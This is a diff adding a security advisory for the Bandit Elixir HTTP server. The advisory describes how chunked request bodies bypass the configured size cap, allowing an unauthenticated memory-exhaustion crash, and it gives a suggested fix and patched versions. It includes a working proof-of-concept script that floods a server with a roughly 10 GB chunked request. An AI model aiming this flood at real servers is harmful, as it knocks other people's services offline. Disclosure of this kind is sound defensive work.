@@ -1,0 +1,74 @@
+---
+description: |-
+  ### Summary
+  
+  Bandit's HTTP/1 chunked-body reader silently drops the request size cap that the application configures (e.g. `Plug.Parsers`' default 8 MB `length:`) and buffers the entire body in memory before the application sees it. An unauthenticated attacker can crash any Bandit-fronted Phoenix/Plug app (BEAM OOM) with a single `Transfer-Encoding: chunked` request to any URL.
+  
+  ### Details
+  
+  In `lib/bandit/http1/socket.ex:189`, the chunked clause of `read_data/2` only forwards `:read_length` and `:read_timeout` to `do_read_chunked_data!/5` (`:242`); the caller-supplied `:length` cap is dropped. The recursion accumulates every chunk into an iolist and `IO.iodata_to_binary/1` (`:196`) materializes the whole thing as one binary. The function always returns `{:ok, body, ...}` — never `{:more, ...}` — so callers cannot interpose a 413.
+  
+  The content-length sibling at `:210` does the right thing:
+  
+  ```elixir
+  max_to_return = min(unread_content_length, Keyword.get(opts, :length, 8_000_000))
+  ```
+  
+  Because `Plug.Parsers` runs before routing and auth in the standard Phoenix endpoint, the attacker needs no credentials and no valid route — any `Content-Type` matching a configured parser (`:json`, `:urlencoded`, `:multipart`) on any path triggers the bug.
+  
+  **Suggested Fix:** track accumulated bytes in `do_read_chunked_data!` and either return `{:more, ...}` or raise `request_error!` once `:length` is exceeded, mirroring the content-length path.
+  
+  ### PoC
+  
+  Self-contained — boots a Bandit server with a realistic `Plug.Parsers` (`length: 8_000_000`) and floods it. Save as `chunked_oom.exs`, run `elixir chunked_oom.exs`, and watch `beam.smp` RSS climb past 8 MB until the OS OOM-killer fires.
+  
+  ```elixir
+  Mix.install([{:bandit, "~> 1.10"}, {:plug, "~> 1.19"}])
+  
+  defmodule DemoApp do
+    use Plug.Builder
+  
+    # The `length` option here is ignored by the attack
+    plug Plug.Parsers, parsers: [:urlencoded, :json], pass: ["*/*"], json_decoder: JSON, length: 8_000_000
+    plug :respond
+  
+    def respond(conn, _), do: Plug.Conn.send_resp(conn, 200, "ok")
+  end
+  
+  {:ok, _} = Bandit.start_link(plug: DemoApp, ip: {127, 0, 0, 1}, port: 4321)
+  
+  # Builds a single 1MB chunk that is reused on the client-side but accumulated on the server-side.
+  chunk = :binary.copy(<<?A>>, 1_048_576)
+  frame = "#{Integer.to_string(1_048_576, 16)}\r\n#{chunk}\r\n"
+  
+  {:ok, sock} = :gen_tcp.connect(~c"127.0.0.1", 4321, [:binary, active: false])
+  
+  :ok =
+    :gen_tcp.send(sock, """
+    POST / HTTP/1.1\r
+    Host: 127.0.0.1\r
+    Transfer-Encoding: chunked\r
+    Content-Type: application/json\r
+    Connection: close\r
+    \r
+    """)
+  
+  Enum.each(1..10_240, fn _ -> :ok = :gen_tcp.send(sock, frame) end)
+  :ok = :gen_tcp.send(sock, "0\r\n\r\n")
+  
+  IO.inspect(:gen_tcp.recv(sock, 0, 120_000))
+  ```
+  
+  ### Impact
+  
+  Unauthenticated pre-route DoS via BEAM memory exhaustion. One request from one connection crashes the server. Affects every Bandit-fronted application that reads request bodies anywhere — i.e. essentially every Phoenix app, since the default endpoint mounts `Plug.Parsers` ahead of routing and auth. Configured `length:` caps on `Plug.Parsers` and `Plug.Conn.read_body/2` are silently ineffective on the chunked path.
+disclosure_date: 2026-05-19
+first_patched_versions:
+  - 1.11.1
+id: GHSA-9q9q-324x-93r2
+link: https://github.com/advisories/GHSA-9q9q-324x-93r2
+package: bandit
+severity: high
+title: 'Bandit: Unauthenticated one-shot DoS via `Transfer-Encoding: chunked`'
+vulnerable_version_ranges:
+  - '>= 1.4.0, < 1.11.1'
